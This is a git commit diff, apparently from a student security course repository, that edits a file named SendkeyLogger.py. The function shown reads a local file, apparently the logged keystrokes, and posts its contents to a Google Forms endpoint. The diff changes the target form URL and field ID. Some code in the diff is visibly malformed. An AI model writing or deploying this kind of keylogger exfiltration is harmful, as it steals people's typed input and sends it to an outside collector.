447fa1e58062d76715506dc55019f7a180ef30e8
Richard Dunbar <112132616+RND27@users.noreply.github.com>
2022-11-27 10:58:16 -0500

    Update SendkeyLogger.py

--- Week_13 ( Reconnaissance | Scanning)/SendkeyLogger.py
+++ Week_13 ( Reconnaissance | Scanning)/SendkeyLogger.py
@@ -13,8 +13,8 @@ time.sleep(1)
 def send_request():
 	form_input = open(/home/student/ITP270_001N_FALL2022)
 	form_send = form_input.read() 
-	url= 'https://docs.google.com/forms/u/1/d/e/1FAipQLSe-0wDfi5A0QP3Wh 
-	form_data = {'entry.839337160': f"'{form_send}'"} 
+	url= 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdiMHViuoPlW3UujN2b0M3xiT81aKGeEp779j46XlD58PzZ1A/formResponse' 
+	form_data = {'entry.2005620554': f"'{form_send}'"} 
 	r = requests.post(url, data=form_data) 
 	
 def interval():
